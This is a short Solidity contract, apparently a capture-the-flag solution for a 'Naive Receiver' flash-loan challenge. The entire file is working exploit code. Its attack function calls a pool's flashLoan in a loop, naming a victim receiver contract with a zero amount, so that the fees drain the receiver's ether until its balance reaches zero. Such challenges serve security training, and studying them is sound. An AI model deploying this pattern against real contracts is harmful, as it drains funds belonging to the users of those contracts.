// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NaiveReceiverAttack {

    function attack(address pool, address receiver) external {
        while(receiver.balance > 0) {
            (bool success, ) = pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", receiver, 0));
            require(success,"Attack was not succeeded");
        }
    }
}